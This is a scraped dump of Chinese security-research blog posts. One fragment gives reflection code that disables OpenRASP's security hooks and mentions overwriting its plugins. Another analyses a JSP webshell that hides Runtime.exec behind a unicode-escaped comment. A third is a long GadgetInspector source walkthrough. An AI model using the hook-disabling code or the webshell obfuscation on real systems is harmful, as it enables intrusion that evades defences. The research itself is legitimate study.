Thread.currentThread().getContextClassLoader().loadClass(&quot;com.baidu.openrasp.config.Config&quot;); java.lang.reflect.Method getConfig = clz.getDeclaredMethod(&quot;getConfig&quot;); java.lang.reflect.Field disableHooks = clz.getDeclaredField(&quot;disableHooks&quot;); disableHooks.setAccessible(true); Object ins = getConfig.invoke(null); disableHooks.set(ins,true); &#125; catch (Exception e) &#123;&#125;&#125; 首先执行命令返回可爱小恐龙 当我访问off路由成功关闭rasp的hook功能 当然你可能会说还有其他的关闭的hook点，比如刚刚上面提到的doCheckWithoutRequest实际上最终是通过doRealCheckWithoutRequest去进行下一步操作，但毕竟也是类似的意思就不多考虑这些更改属性的了点到为止，毕竟只要破坏中间任一环节即可 覆盖插件我们知道OpenRASP通过InitFileWatcher,一旦其中的js文件被创建、改变、删除都会触发插件的 并且我们可以看到插件配置当中对于文件上传js默认是关闭逻辑检测的开关 因此我们如果存在任意文件上传并且可以跨目录再并且知道插件路径的情况下，虽然不是很通用但好歹也是一个手段 至于有没有其他方式这里暂时我就不探究了，顺便吐槽学校的实训太累了，心理上的累 参考文章官方文档 C++中构造函数的两种写法 JNIENV介绍 以OpenRASP为基础-展开来港港RASP的类加载","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Rasp","slug":"Rasp","permalink":"https://y4tacker.github.io/tags/Rasp/"}]},{"title":"JspWebShell新姿势解读","slug":"year/2022/5/JspWebShell新姿势解读","date":"2022-05-16T15:23:07.000Z","updated":"2024-08-04T09:01:49.364Z","comments":true,"path":"2022/05/16/year/2022/5/JspWebShell新姿势解读/","link":"","permalink":"https://y4tacker.github.io/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"JspWebShell新姿势解读写在前面​ 刚刚无意间发现我yzddmr6发了篇新文章，里面提到了一个jspwebshell的新姿势，但是没有具体分析，那么这里我就接着来分析一波 首先代码长这样 12345&lt;% Runtime.getRuntime(). //\\u000d\\uabcdexec(&quot;open -na Calculator&quot;);%&gt; 正文如果按照传统Java的javac的方式编译这样一定是会出错的，这里不贴图自己试试，而jsp不同于普通的java程序，jsp是有自己的对类编译时的实现机制,其编译类的时候最终是在org.apache.jasper.compiler.JDTCompiler#generateClass生成我们的class文件(省略中途的很多步骤直捣黄龙，不然讲着也费劲) 这是调用栈，有兴趣可以深入分析 12345678910111213141516171819202122232425262728293031323334353637383940414243getNextToken0:1482, Scanner (org.eclipse.jdt.internal.compiler.parser)getNextToken:1462, Scanner (org.eclipse.jdt.internal.compiler.parser)fetchNextToken:12999, Parser (org.eclipse.jdt.internal.compiler.parser)parse:12891, Parser (org.eclipse.jdt.internal.compiler.parser)parse:13277, Parser (org.eclipse.jdt.internal.compiler.parser)parseStatements:225, MethodDeclaration (org.eclipse.jdt.internal.compiler.ast)parseMethods:1152, TypeDeclaration (org.eclipse.jdt.internal.compiler.ast)getMethodBodies:11941, Parser (org.eclipse.jdt.internal.compiler.parser)process:888, Compiler (org.eclipse.jdt.internal.compiler)processCompiledUnits:575, Compiler (org.eclipse.jdt.internal.compiler)compile:475, Compiler (org.eclipse.jdt.internal.compiler)compile:426, Compiler (org.eclipse.jdt.internal.compiler)generateClass:457, JDTCompiler (org.apache.jasper.compiler)compile:397, Compiler (org.apache.jasper.compiler)compile:367, Compiler (org.apache.jasper.compiler)compile:351, Compiler (org.apache.jasper.compiler)compile:605, JspCompilationContext (org.apache.jasper)service:399, JspServletWrapper (org.apache.jasper.servlet)serviceJspFile:379, JspServlet (org.apache.jasper.servlet)service:327, JspServlet (org.apache.jasper.servlet)service:763, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilter:53, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)invoke:197, StandardWrapperValve (org.apache.catalina.core)invoke:97, StandardContextValve (org.apache.catalina.core)invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)invoke:135, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:687, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:357, CoyoteAdapter (org.apache.catalina.connector)service:382, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1732, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:844, Thread (java.lang) 好了不扯那么多，回到正题，在讲之前我们需要知道有个东西叫javadoc相信大家都很熟悉了就是用于描述方法或者类的作用的东西，而造成可以解析的原因其实和这个有关系(jsp编译过程当中用到了AST，这里不多扯) 在生成最终class的过程当中，它会遍历文件当中的字符并做unicode解码处理，下图可以看到正在遍历的过程 而对于unicode的处理最终在org.eclipse.jdt.internal.compiler.parser.Scanner#getNextToken0，简单看了眼代码其实是为了让AST兼容注释功能，回到代码如果开头是/，之后会判断下一个字符是/还是*,也就是单行或者多行注释咯 根据代码我们这里显然lookAhead为0，因此我们来看if分支，继续往下走当前为\\r如果下一个又是unicode编码的字符会进行unicode解码同时isJavadoc属性会赋值true 接着往下我们的\\uabcd是乱码字符和下面条件也不符合所以也不继续走了简单看看代码呗，不走的原因一方面是这个下一个字符不是\\n另一方面checkNonExternalizedStringLiterals在我这个tomcat版本默认为false 但是我还是好奇的看了一眼parseTags函数，在里面处理的注释前缀是TAG_PREFIX = &quot;//$NON-NLS-&quot;.toCharArray();，以及IDENTITY_COMPARISON_TAG = &quot;//$IDENTITY-COMPARISON$&quot;很神奇简单考古可以看到https://stackoverflow.com/questions/654037/what-does-non-nls-1-mean，从描述可以看出作用是为了国际化，但更具体的可以看看官方的这篇文章了解写的很详细https://www.eclipse.org/articles/Article-Internationalization/how2I18n.html 当然肯定能在这个层面上做更多的混淆，接下来的灵活的工作就交给大家自己构造了，感谢我yzddmr6，之前还没想到可以这样 但是还是不知道如果默认属性开的情况下，为什么出现//\\u000d\\u000a或//\\u000d\\u000d就会判别是要去识别那两个标签，希望有懂的师傅说说","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"}]},{"title":"GadgetInspector源码分析","slug":"year/2022/5/GadgetInspector源码分析","date":"2022-05-09T01:56:31.000Z","updated":"2024-08-04T09:01:49.335Z","comments":true,"path":"2022/05/09/year/2022/5/GadgetInspector源码分析/","link":"","permalink":"https://y4tacker.github.io/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"GadgetInspector源码分析前置废话我不想搞介绍，就这样吧，写这个主要是网上的对我很晦涩，很多别人觉得简单的我不会，包括一些汇编指令等，当然本篇也是站在很多前辈的肩膀上进行学习，属实是少花了很多功夫 在分析gadgetinspector源码的时候，大概会对各个核心类讲解，并简单分析ASM部分，btw本篇基于jdk8进行分析 当然既然是学习，那么我们肯定是需要跟踪代码的，而GI这款工具属实头疼，本身不仅引入了jdk的一些依赖如rt.jar，在调试的过程当中也出现了gadgetinspector当中的类，属实不适合学习时使用，为了解决这个问题，我在gadgetinspector.ClassResourceEnumerator#getAllClasses当中将源码修改如此，这样我便能自行写代码逻辑，并展开学习，我个人认为化繁为简也是一个很重要的过程，如下我剔除了jdk原本的类，并且要求全类名包含特定字符，因此解决了这个问题，当然在具体使用的时候还是要替换回来 123456789101112public Collection&lt;ClassResource&gt; getAllClasses() throws IOException &#123; // Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;(getRuntimeClasses()); Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;(); if (ConfigHelper.onlyJDK) return result; for (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123; if (classInfo.getName().contains(&quot;yyds&quot;))&#123; result.add(new ClassLoaderClassResource(classLoader, classInfo.getResourceName())); &#125; &#125; return result;&#125; 可以看到经过简单的优化，过程也更加清晰，但是在后面有些地方需要改回来不然得不到正确结果，这里是为了分析所以暂时改一下 在学习的时候配合反汇编代码会更容易理解，Java也自带了查看的方法javap -c 类名 lol，多逼逼一句一定要在熟悉jvm stack和本地变量表，不然很多逻辑会是懵的 ASM部分这部分不建议直接看，建议在后面看到具体部分再来看看 模拟JVM栈帧变化这部分很重要如果搞不明白后面在看GI代码的时候会很懵逼 在程序运行的过程中，每一个线程都对应一个属于自己的JVM Stack。当一个新线程开始时会在内存上分配一个属于自己的JVM Stack；当该线程执行结束后，相应的JVM Stack内存空间也就被回收了。 在JVM Stack当中，是栈的结构，里面存储的是frames；每一个frame空间可以称之为Stack Frame。当调用一个新方法的时候，就会在JVM Stack上分配一个frame空间；当方法退出时，相应的frame空间也会JVM Stack上进行清除掉（出栈操作）。在frame空间当中，有两个重要的结构，即local variables（一个索引从0开始的数组）和operand stack（栈的结构）。对于每一个方法来说，它都是在自己的Stack Frame上来运行的，在编译的时候，就决定了local variables和operand stack的大小。 这里特别要注意在方法刚开始的时候，operand stack是空，不需要存储任何的数据，而local variables的初始状态，则需要考虑三个因素： 当前方法是否为static方法。如果当前方法是non-static方法，则需要在local variables索引为0的位置存在一个this变量；如果当前方法是static方法，则不需要存储this。 当前方法是否接收参数。方法接收的参数，会按照参数的声明顺序放到local variables当中。 方法参数是否包含long或double类型。如果方法的参数是long或double类型，那么它在local variables当中占用两个位置。 这里推荐一个IDEA的插件ASM Bytecode Viewer，可以很方便配合学习理解，同时如果需要查当中的汇编指令的含义也很简单，去官网看看就好https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html ClassVisitor我们只要知道在ClassVisitor类当中，定义的visitXxx()方法中的参数与ClassFile结构密切相关就很关键了 首先看看里面的字段 123456public abstract class ClassVisitor &#123; //指出了当前使用的ASM API版本 protected final int api; //一个ClassVisitor类型的数据，可以将多个ClassVisitor串连起来 protected ClassVisitor cv;&#125; ClassVisitor当中许多的visitXxx()方法，这些visitXxx()方法与ClassFile的结构密切相关，而这下面四个才是我们关注的主体 12345678910111213141516171819202122public abstract class ClassVisitor &#123; public void visit( final int version, final int access, final String name, final String signature, final String superName, final String[] interfaces); public FieldVisitor visitField( // 访问字段 final int access, final String name, final String descriptor, final String signature, final Object value); public MethodVisitor visitMethod( // 访问方法 final int access, final String name, final String descriptor, final String signature, final String[] exceptions); public void visitEnd();&#125; 其中signature为类签名（非泛型为NUll），同时visitXxx()方法，也有调用顺序，了解下就好，结合这个调用顺序，GI的这部分代码就很好懂了 123456789101112131415visit[visitSource][visitModule][visitNestHost][visitPermittedSubclass][visitOuterClass]( visitAnnotation | visitTypeAnnotation | visitAttribute)*( visitNestMember | visitInnerClass | visitRecordComponent | visitField | visitMethod)* visitEnd MethodVisitor和上面很多部分相似，我们直接入正文，也是有很多关键的visitxxx方法，对一些我们需要的做个精简的调用，看英文名称就能知道意思就不多说每个部分了 123456789101112131415161718(visitParameter)*[visitAnnotationDefault](visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation | visitTypeAnnotation | visitAttribute)*[ visitCode ( visitFrame//访问当前局部变量表和操作数栈中元素的状态，参数就是局部变量表和操作数栈的内容 | visitXxxInsn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs] 这里主要记录下visitxxxInsn 123456visitFieldInsn ： 访问某个成员变量的指令，支持GETSTATIC, PUTSTATIC, GETFIELD or PUTFIELD.visitIincInsn ： 访问自增指令visitVarInsn ：访问局部变量指令，就是取局部变量变的值放入操作数栈visitMethodInsn ：访问方法指令，就是调用某个方法，支持INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC or INVOKEINTERFACE.visitInsn ： 访问无操作数的指令，例如nop，duo等等visitTypeInsn：访问type指令，即将一个类的全限定名作为参数然后new一个对象压入操作数栈中 在GI当中我们主要关心visitMethodInsn，顺便说一些相关指令其中invokestatic用来调用静态方法；invokespecial用来调用私有方法，父类方法(super.)，类构造器方法；invokeinterface调用接口方法；invokedynamic方法动态执行；invokevirtual调用所有虚方法，即除了以上的方法外全用invokevirtual调用。 分析下面根据流程分析具体的类当中的操作 MethodDiscovery这个方法主要是获得类以及方法的信息 其中在methods.dat里面按照指定格式记录：类名、方法名、参数以及返回值、是否为静态方法 在classes.dat里面按照指定格式记录：类名、父类名、实现的接口名、是否为接口、类的所有字段、注解名 看了下main函数的主体 1234ClassLoader classLoader = Util.getWarClassLoader(Paths.get(&quot;/Users/y4tacker/Desktop/test/shorter-0.0.1-SNAPSHOT.jar&quot;));MethodDiscovery methodDiscovery = new MethodDiscovery();methodDiscovery.discover(new ClassResourceEnumerator(classLoader));methodDiscovery.save(); 首先第一行的gadgetinspector.Util#getWarClassLoader不是很难不贴代码了，首先创建了一个临时文件夹，通过addShutdownHook在jvm shutdown自动删除，之后将jar/war的文件解压到临时文件夹，并配置/资源文件的路径，并返回URLClassLoader 之后调用gadgetinspector.MethodDiscovery#discover，可以看出通过foreach遍历，之后使用asm的ClassVisitor、MethodVisitor，利用观察模式去扫描所有的class和method并记录 123456789101112131415public void discover(final ClassResourceEnumerator classResourceEnumerator) throws Exception &#123; for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; //使用asm的ClassVisitor、MethodVisitor，利用观察模式去扫描所有的class和method并记录 cr.accept(new MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES); &#125; catch (Exception e) &#123; LOGGER.error(&quot;Exception analyzing: &quot; + classResource.getName(), e); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 调用gadgetinspector.ClassResourceEnumerator#getAllClasses，首先里面调用了*getRuntimeClasses()*函数 可以看到核心代码 1234567891011URL stringClassUrl = Object.class.getResource(&quot;String.class&quot;);URLConnection connection = stringClassUrl.openConnection();Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;();if (connection instanceof JarURLConnection) &#123; URL runtimeUrl = ((JarURLConnection) connection).getJarFileURL(); URLClassLoader classLoader = new URLClassLoader(new URL[]&#123;runtimeUrl&#125;); for (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123; result.add(new ClassLoaderClassResource(classLoader, classInfo.getResourceName())); &#125;&#125; 他先获取JDK内部的String类的路径，加载String类的同时，类加载器还会将rt.jar的全部类一起加载，最后将rt.jar当中的所有类加入到ClassResource类型的result并且返回 之后也就是一个继承了ClassVisitor的MethodDiscoveryClassVisitor分别在visitMethod和visitEnd依次添加方法和类到缓存 之后就是调用save方法保存到文件 1234567891011121314151617181920public void save() throws IOException &#123; //保存和读取使用Factory实现 //classes.dat数据格式： //类名(例：java/lang/String) 父类 接口A,接口B,接口C 是否接口 字段1!字段1access!字段1类型!字段2!字段2access!字段1类型 DataLoader.saveData(Paths.get(&quot;classes.dat&quot;), new ClassReference.Factory(), discoveredClasses); //methods.dat数据格式： //类名 方法名 方法描述 是否静态方法 DataLoader.saveData(Paths.get(&quot;methods.dat&quot;), new MethodReference.Factory(), discoveredMethods); //形成 类名(ClassReference.Handle)-&gt;类(ClassReference) 的映射关系 Map&lt;ClassReference.Handle, ClassReference&gt; classMap = new HashMap&lt;&gt;(); for (ClassReference clazz : discoveredClasses) &#123; classMap.put(clazz.getHandle(), clazz); &#125; //保存classes.dat和methods.dat的同时，对所有的class进行递归整合，得到集合&#123;class:[subclass]&#125;， // 递归寻找class的父类、超类或实现的接口类，保存至inheritanceMap.dat InheritanceDeriver.derive(classMap).save();&#125; PassthroughDiscovery这个类用来寻找函数的第几个参数能控制返回值： 0代表this、1-n分别代表第几个函数当中的形参 我们主要来关注gadgetinspector.PassthroughDiscovery#discover，先简单看看逻辑 12345678910111213141516171819202122public void discover(final ClassResourceEnumerator classResourceEnumerator, final GIConfig config) throws IOException &#123; //加载文件记录的所有方法信息 Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); //加载文件记录的所有类信息 Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses(); //加载文件记录的所有类继承、实现关联信息 InheritanceMap inheritanceMap = InheritanceMap.load(); //搜索方法间的调用关系，缓存至methodCalls集合，返回 类名-&gt;类资源 映射集合 Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator); //对方法调用关系进行字典排序 List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls(); /** * classResourceByName：类资源集合 * classMap：类信息集合 * inheritanceMap：继承、实现关系集合 * sortedMethods：方法集合 * SerializableDecider：决策者 */ passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods, config.getSerializableDecider(methodMap, inheritanceMap));&#125; 跳过加载文件的部分，我们来看gadgetinspector.PassthroughDiscovery#discoverMethodCalls 12345678910111213141516private Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(final ClassResourceEnumerator classResourceEnumerator) throws IOException &#123; Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = new HashMap&lt;&gt;(); for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; MethodCallDiscoveryClassVisitor visitor = new MethodCallDiscoveryClassVisitor(Opcodes.ASM6); cr.accept(visitor, ClassReader.EXPAND_FRAMES); classResourcesByName.put(visitor.getName(), classResource); &#125; catch (Exception e) &#123; LOGGER.error(&quot;Error analyzing: &quot; + classResource.getName(), e); &#125; &#125; &#125; return classResourcesByName;&#125; 很相似直接跟进MethodCallDiscoveryClassVisitor，其中重要的是gadgetinspector.PassthroughDiscovery.MethodCallDiscoveryClassVisitor#visitMethod 123456789public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) &#123; MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions); //在visit每个method的时候，创建MethodVisitor对method进行观察 MethodCallDiscoveryMethodVisitor modelGeneratorMethodVisitor = new MethodCallDiscoveryMethodVisitor( api, mv, this.name, name, desc); return new JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);&#125; 在MethodCallDiscoveryMethodVisitor内重写了MethodCallDiscoveryMethodVisitor的visitMethodInsn方法，也就是在方法内调用其他方法时，会把方法的相关信息缓存到calledMethods 并且这个calledMethods之前在MethodCallDiscoveryMethodVisitor的初始化构造函数当中将calledMethods的引用也放到了类的成员变量methodCalls当中 12345678public MethodCallDiscoveryMethodVisitor(final int api, final MethodVisitor mv, final String owner, String name, String desc) &#123; super(api, mv); //创建calledMethod收集调用到的method，最后形成集合&#123;&#123;sourceClass,sourceMethod&#125;:[&#123;targetClass,targetMethod&#125;]&#125; this.calledMethods = new HashSet&lt;&gt;(); methodCalls.put(new MethodReference.Handle(new ClassReference.Handle(owner), name, desc), calledMethods);&#125; 接下来就是最重要的逆拓扑排序topologicallySortMethodCalls，这个步骤对于我们之后污点跟踪非常重要，可以看看知道创宇404的文章非常好，这里为了文章清晰将直接复制相关部分 123456789101112131415161718192021private List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123; Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = new HashMap&lt;&gt;(); for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123; MethodReference.Handle method = entry.getKey(); outgoingReferences.put(method, new HashSet&lt;&gt;(entry.getValue())); &#125; // Topological sort methods LOGGER.debug(&quot;Performing topological sort...&quot;); Set&lt;MethodReference.Handle&gt; dfsStack = new HashSet&lt;&gt;(); Set&lt;MethodReference.Handle&gt; visitedNodes = new HashSet&lt;&gt;(); List&lt;MethodReference.Handle&gt; sortedMethods = new ArrayList&lt;&gt;(outgoingReferences.size()); for (MethodReference.Handle root : outgoingReferences.keySet()) &#123; //遍历集合中的起始方法，进行递归搜索DFS，通过逆拓扑排序，调用链的最末端排在最前面， // 这样才能实现入参、返回值、函数调用链之间的污点影响 dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root); &#125; LOGGER.debug(String.format(&quot;Outgoing references %d, sortedMethods %d&quot;, outgoingReferences.size(), sortedMethods.size())); return sortedMethods;&#125; 在代码当中，首先有三个重要的变量 dfsStack：用来分析方法调用顺序，保证在逆拓扑时候不形成环 visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序 sortedMethods：最终逆拓扑排序出来的结果 接下来我们详细看看dfsTsort，可以看到是一个递归的过程 12345678910111213141516171819202122232425private static void dfsTsort(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences, List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes, Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node) &#123; if (stack.contains(node)) &#123; return; &#125; if (visitedNodes.contains(node)) &#123; return; &#125; //根据起始方法，取出被调用的方法集 Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node); if (outgoingRefs == null) &#123; return; &#125; //入栈，以便于递归不造成类似循环引用的死循环整合 stack.add(node); for (MethodReference.Handle child : outgoingRefs) &#123; dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child); &#125; stack.remove(node); visitedNodes.add(node);//记录已被探索过的方法，用于在上层调用遇到重复方法时可以跳过 sortedMethods.add(node);//递归完成的探索，会添加进来&#125; 为了防止在逆拓扑排序形成环，对于待分析的方法，如果在stack里面，则不再入栈了，如果之前已经分析过某方法，也不会再入栈，之后取出被调用的子方法集，遍历这个子方法集递归调用dfsTsort，最后将结果保存到sortedMethods 比较形象的过程看创宇里的图，配合理解代码就不难了 对上图进行逆拓扑排序（DFS方式）： 从med1开始，先将med1加入stack中，此时stack、visited、sortedmethods状态如下： med1还有子方法？有，继续深度遍历。将med2放入stack，此时的状态： med3有子方法吗？有，继续深度遍历。将med7放入stack，此时的状态： med7有子方法吗？没有，从stack中弹出med7并加入visited和sortedmethods，此时的状态： 回溯到上一层，med3还有其他子方法吗？有，med8，将med8放入stack，此时的状态： med8还有子方法吗？没有，弹出stack，加入visited与sortedmethods，此时的状态： 回溯到上一层，med3还有其他子方法吗？没有了，弹出stack，加入visited与sortedmethods，此时的状态： 一直类似上面的过程，得到最终结果：med7、med8、med3、med6、med2、med4、med1 之后的过程就是调用calculatePassthroughDataflow，其中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流(passthroughDataflow主要负责存储参数污染结果，key对应方法名，value对应的是这个方法中可以被污染的参数索引集合)，内置了三种反序列化的策略配置config类：JDK、Jackson、Xstream，这里我只分析默认的JDK反序列化，其他过程都是类似的，继续回到正题 ，ok还是为了减少干扰，我又在函数逻辑稍作修改，因为上文提到过我们跟踪的代码是 123456789101112131415161718192021222324252627package yyds;import java.io.IOException;public class Main &#123; public String main(String args) throws IOException &#123; String cmd = new A().method1(args); return new B().method2(cmd); &#125;&#125;class A &#123; public String method1(String param) &#123; return param; &#125;&#125;class B &#123; public String method2(String param) &#123; return new C().method3(param); &#125;&#125;class C &#123; public String method3(String param) &#123; return param; &#125;&#125; 肉眼可得与构造函数无关，接下来我们具体看看函数calculatePassthroughDataflow做了些什么 根据代码逻辑我们可以看出首先会跳过静态初始化代码(因为静态代码块不出意外基本上是没法被污染的) 接下来在遍历的每个方法时，会先获取它的所属类，传入函数PassthroughDataflowClassVisitor进行ASM访问者模式的分析，这里我们依然重点关注的是visitMethod函数，这里首先需要目标是需要观察的method，否则跳过 之后会传入PassthroughDataflowMethodVisitor做进一步的处理，在JSRInlinerAdapter的最后执行visitEnd会触发这个观察过程，猜测这样做的目的是便于筛选，便于观察目的类 那么我们来具体看看这个PassthroughDataflowMethodVisitor类，首先它是继承于父类TaintTrackingMethodVisitor,首先是visitCode函数，很简单就是为了模拟本地变量表和操作数栈的变化 12345678910111213141516171819public void visitCode() &#123; super.visitCode(); int localIndex = 0; int argIndex = 0; if ((this.access &amp; Opcodes.ACC_STATIC) == 0) &#123; //非静态方法，第一个局部变量应该为对象实例this //添加到本地变量表集合 setLocalTaint(localIndex, argIndex); localIndex += 1; argIndex += 1; &#125; for (Type argType : Type.getArgumentTypes(desc)) &#123; //判断参数类型，得出变量占用空间大小，然后存储 setLocalTaint(localIndex, argIndex); localIndex += argType.getSize(); argIndex += 1; &#125;&#125; 之后的visitInsn方法(每当访问无操作数的指令，例如nop，duo等等，ASM都会调用这个方法，这里我们只需要关注返回值的部分lol) 1234567891011121314151617181920@Overridepublic void visitInsn(int opcode) &#123; switch(opcode) &#123; case Opcodes.IRETURN://从当前方法返回int case Opcodes.FRETURN://从当前方法返回float case Opcodes.ARETURN://从当前方法返回对象引用 returnTaint.addAll(getStackTaint(0));//栈空间从内存高位到低位分配空间 break; case Opcodes.LRETURN://从当前方法返回long case Opcodes.DRETURN://从当前方法返回double returnTaint.addAll(getStackTaint(1)); break; case Opcodes.RETURN://从当前方法返回void break; default: break; &#125; super.visitInsn(opcode);&#125; 之后还有个重要的就是visitMethodInsn(在方法体内，调用了其他方法，都会触发这个方法的调用)，这里逻辑也不难但是为了梳理逻辑这里先不谈，之后我们以开题提到的代码来做讲解 首先可以看到逆拓扑排序的结果以及可被污染的位置， 那么具体跟入这个过程分析 第一步，首先是对C.method3进行观察，节约纸张不废话，首先是到gadgetinspector.PassthroughDiscovery.PassthroughDataflowClassVisitor#visitMethod筛选目标类，之后传入到PassthroughDataflowMethodVisitor当中做进一步的观察，由于method3方法体比较简单，只是返回传入的参数 12345class C &#123; public String method3(String param) &#123; return param; &#125;&#125; 由于在方法体内字节码操作了变量，因此会调用visitVarInsn，也就是在gadgetinspector.TaintTrackingMethodVisitor#visitVarInsn，在这里返回变量触发了aload操作指令，这里会将返回参数对应的本地变量推送至栈顶 之后对应的ARETURN指令会触发调用gadgetinspector.PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitInsn，这里将污染的变量保存到returnTaint变量当中，这里返回long和double的和上面不一样主要是因为它们占两个位置 至此我们的第一步method3也就结束了，之后就是将其缓存到passthroughDataflow当中 接下来第二步，也就是调用B.method2方法，这个稍微复杂一点，结合对应的汇编来理解呗 123456789public java.lang.String method2(java.lang.String); Code: 0: new #2 // class yyds/C 3: dup 4: invokespecial #3 // Method yyds/C.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String; 11: areturn 跳开第一步new，之后dup会触发gadgetinspector.TaintTrackingMethodVisitor#visitInsn，做的操作也很easy，可能觉得这个很不可思议很难理解，dup指令部分可以拉到最下面看看题外话部分呢 123case Opcodes.DUP: push(get(0)); break; 之后INVOKESPECIAL会触发visitMethodInsn，当然肉眼可知实例化C的时候与我们无关没啥好康的，之后又是aload_1去触发visitVarInsn的过程，这里逻辑类似我们第一步讲的那样没啥好说的呗，之后又是invokevirtual触发visitMethodInsn的调用也就是new C().method3()中调用方法3的过程，虽然结合注释也是能看懂的这里也简单说说 首先获取method参数类型，由于是非静态方法会进入if条件 之后构造了污染参数集合，for循环当中根据参数类型大小，从栈底获取入参，参数入栈是从右到左的 由于不是构造函数，会新建一个HashSet用于保存污染参数的返回值 之后判断是否和同一方法体内的其它方法返回值关联，有关联则添加到栈底，等待执行return时保存 至此我们也得到了我们可以污染B.method2，控制返回值 之后A.method1同C.method3就不再重复，最后分析的是main方法的入参args是否会污染到其返回值，也其实差不多，没必要再浪费笔墨了，看看下面反汇编代码即可，有兴趣可以自己更入具体过程看看 12345678910111213Code: 0: new #2 // class yyds/A 3: dup 4: invokespecial #3 // Method yyds/A.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/A.method1:(Ljava/lang/String;)Ljava/lang/String; 11: astore_2 12: new #5 // class yyds/B 15: dup 16: invokespecial #6 // Method yyds/B.&quot;&lt;init&gt;&quot;:()V 19: aload_2 20: invokevirtual #7 // Method yyds/B.method2:(Ljava/lang/String;)Ljava/lang/String; 23: areturn 至此我们得到了如下的结果 1234yyds/C method3 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/B method2 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/A method1 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/Main main (Ljava/lang/String;)Ljava/lang/String; 1, CallGraphDiscovery这个类主要是为了检查子方法的参数是否可以被父方法的参数所影响 也是从创宇当中的例子开始 123456789private MyObject obj;public void parentMethod(Object arg)&#123; ... TestObject obj1 = new TestObject(); Object obj2 = obj1.childMethod1(arg); this.obj.childMethod(obj2); ...&#125; 